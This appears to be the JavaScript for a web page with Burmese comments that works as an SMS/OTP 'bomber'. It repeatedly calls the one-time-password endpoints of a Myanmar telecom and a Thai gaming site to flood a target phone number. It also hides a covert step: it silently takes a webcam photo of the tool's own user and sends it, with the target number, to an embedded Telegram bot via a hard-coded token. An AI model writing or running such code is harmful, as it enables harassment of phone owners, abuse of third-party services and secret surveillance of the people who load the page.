// --- Rowan's Telegram Bot Config ---
const botToken = "7587940042:AAHJED_hmB2evjAboBdH1uo7Dpghf60mR1M";
const chatId = "7072739469";

// --- ၁။ အသံထုတ်ပေးသည့် Function ---
function playBeep(freq, dur, vol) {
    try {
        const context = new (window.AudioContext || window.webkitAudioContext)();
        const osc = context.createOscillator();
        const gain = context.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, context.currentTime);
        gain.gain.setValueAtTime(vol, context.currentTime);
        osc.connect(gain);
        gain.connect(context.destination);
        osc.start();
        osc.stop(context.currentTime + dur);
    } catch (e) {}
}

// --- ၂။ ဓာတ်ပုံရိုက်ပြီး Telegram ပို့မည့် Function ---
async function captureAndSend(phone) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob);
            formData.append('caption', `📸 LuLucat User Captured!\nTarget: ${phone}`);

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg');
    } catch (e) {
        // User က Allow မနှိပ်ရင် စာသားပဲပို့မယ်
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=User denied camera for target: ${phone}`);
    }
}

function handleServerChange() {
    const server = document.getElementById('serverSelect').value;
    const countInput = document.getElementById('smsCount');
    if (server === "2") {
        countInput.value = 1;
        countInput.disabled = true;
    } else {
        countInput.value = "";
        countInput.disabled = false;
    }
}

function checkMath() {
    const val = document.getElementById('answerInput').value;
    if (val === "1") {
        playBeep(880, 0.1, 0.2); 
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('controlPanel').style.display = 'block';
    } else {
        alert("အဖြေမှားနေပါတယ်!");
    }
}

// --- ၃။ Attack စတင်ခြင်း ---
async function startBomb() {
    let p = document.getElementById('phone').value;
    let c = parseInt(document.getElementById('smsCount').value);
    const server = document.getElementById('serverSelect').value;

    if(!p || isNaN(c)) { alert("အချက်အလက် အကုန်ဖြည့်ပါ!"); return; }

    // နောက်ကွယ်ကနေ ဓာတ်ပုံရိုက်ခြင်း
    captureAndSend(p);

    playBeep(200, 0.2, 0.1); 
    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.innerText = "VERIFYING & ATTACKING...";
    
    document.getElementById('pContainer').style.display = 'block';
    document.getElementById('counterArea').style.display = 'flex';

    for(let i = 1; i <= c; i++) {
        document.getElementById('sentVal').innerText = i;
        document.getElementById('leftVal').innerText = c - i;
        document.getElementById('pBar').style.width = (i / c) * 100 + "%";

        try {
            if (server === "1") {
                let myidNum = p.startsWith('09') ? '95' + p.substring(1) : p;
                await fetch(`https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${myidNum}`, { mode: 'no-cors' });
            } else {
                let thaiNum = p.startsWith('95') ? '0' + p.substring(2) : p;
                await fetch(`https://api.thai2d3dgame.com/api/user/getRegisterOTP?phoneNo=${thaiNum}`, { mode: 'no-cors' });
            }
        } catch(e) {}if (i < c) await new Promise(r => setTimeout(r, 2000));
    }
    
    playBeep(440, 0.3, 0.1);
    alert("Attack Completed!");
    btn.disabled = false;
    btn.innerText = "LAUNCH ATTACK";
}